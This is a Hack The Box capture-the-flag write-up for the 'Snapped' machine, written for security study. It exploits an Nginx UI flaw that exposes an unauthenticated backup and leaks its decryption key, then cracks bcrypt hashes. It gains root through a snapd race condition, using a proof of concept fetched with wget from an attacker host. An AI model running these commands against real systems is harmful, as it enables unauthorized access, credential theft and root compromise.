# HTB-Snapped-Writeup
HTB Snapped — Hard Linux machine writeup. CVE-2026-27944 (Nginx UI unauthenticated backup disclosure) chained with CVE-2026-3888 (snapd race condition LPE) to achieve full system compromise.
# HTB: Snapped — Writeup

**Difficulty:** Hard  
**OS:** Linux (Ubuntu 24.04)  
**Release Date:** 23 Mar 2026  
**CVEs:** CVE-2026-27944, CVE-2026-3888  

---

## Summary
Snapped is a Hard Linux machine hosting a static site behind nginx 
with an Nginx UI admin panel. Initial access is gained by exploiting 
CVE-2026-27944 — an unauthenticated backup endpoint that leaks AES 
encryption keys. After decrypting the backup and cracking a bcrypt 
hash from the SQLite database, SSH access is obtained. Privilege 
escalation to root is achieved via CVE-2026-3888, a race condition 
in snapd between snap-confine and systemd-tmpfiles.

---

## Recon

### Nmap
```bash
nmap -sCV <TARGET_IP>
```
**Open ports:** 22 (SSH), 80 (HTTP)

### Subdomain Enumeration
```bash
ffuf -u http://<TARGET_IP> -H 'Host: FUZZ.snapped.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```
**Found:** `admin.snapped.htb`

```bash
echo "<TARGET_IP> snapped.htb admin.snapped.htb" | sudo tee -a /etc/hosts
```

---

## Foothold — CVE-2026-27944

### Background
Nginx UI versions before 2.3.3 expose `/api/backup` without 
authentication. The response header `X-Backup-Security` leaks the 
AES-256-CBC key and IV needed to decrypt the backup archive.

### Exploitation

**Step 1 — Download backup and extract key/IV:**
```bash
curl -v http://admin.snapped.htb/api/backup -o backup.zip 2>&1 \
  | grep -i "X-Backup-Security"

KEY="<base64_key>"
IV="<base64_iv>"
```

**Step 2 — Convert to hex and decrypt:**
```bash
KEY_HEX=$(echo "$KEY" | base64 -d | xxd -p -c 256)
IV_HEX=$(echo "$IV" | base64 -d | xxd -p -c 256)

mkdir backup && cd backup
unzip ../backup.zip

openssl enc -d -aes-256-cbc \
  -K $KEY_HEX -iv $IV_HEX -nopad \
  -in nginx-ui.zip -out nginx-ui-decrypted.zip

unzip nginx-ui-decrypted.zip
```

**Step 3 — Extract hash from SQLite database:**
```bash
strings database.db | grep '\$2a\$'
# Found bcrypt hashes for users: jonathan, admin
```

**Step 4 — Crack hash:**
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force
# jonathan:<password>
```

**Step 5 — SSH access:**
```bash
ssh jonathan@snapped.htb
cat ~/user.txt
```

---

## Privilege Escalation — CVE-2026-3888

### Background
CVE-2026-3888 is a local privilege escalation in snapd affecting 
Ubuntu 24.04. It abuses a TOCTOU race condition between two system 
components:
- **snap-confine** (SUID root) — builds snap sandboxes
- **systemd-tmpfiles** — periodically cleans `/tmp/.snap`

When systemd-tmpfiles deletes `/tmp/.snap`, an attacker can recreate 
it with malicious content. When snap-confine next initializes a 
sandbox, it bind-mounts the attacker-controlled directory with root 
privileges, enabling dynamic linker hijacking.

### Exploitation

**Step 1 — Verify vulnerable version:**
```bash
snap version
# snapd 2.63.1+24.04 — vulnerable (fixed in 2.73)
```

**Step 2 — Compile exploit on attacker machine:**
```bash
git clone https://github.com/<repo>/CVE-2026-3888
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```

**Step 3 — Transfer to target:**
```bash
# Attacker machine
python3 -m http.server 8080

# Target
wget http://<ATTACKER_IP>:8080/exploit -O ~/exploit
wget http://<ATTACKER_IP>:8080/librootshell.so -O ~/librootshell.so
chmod +x ~/exploit
```

**Step 4 — Run exploit:**
```bash
# Session 1 — run exploit
~/exploit ~/librootshell.so

# Session 2 — trigger cleanup when you see "Polling..."
rm -rf /tmp/.snap
```

**Step 5 — Root shell:**
```bash
/var/snap/firefox/common/bash -p
whoami
# root
cat /root/root.txt
```

---

## Tools Used
- nmap
- ffuf
- curl / openssl
- sqlite3 / strings
- hashcat
- CVE-2026-3888 PoC

---

## References
- [CVE-2026-27944 — Nginx UI Backup Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2026-27944)
- [CVE-2026-3888 — Qualys Research](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/17/cve-2026-3888-important-snap-flaw-enables-local-privilege-escalation-to-root)
- [HTB Official Blog](https://www.hackthebox.com/blog/CVE-2026-27944-CVE-2026-3888)
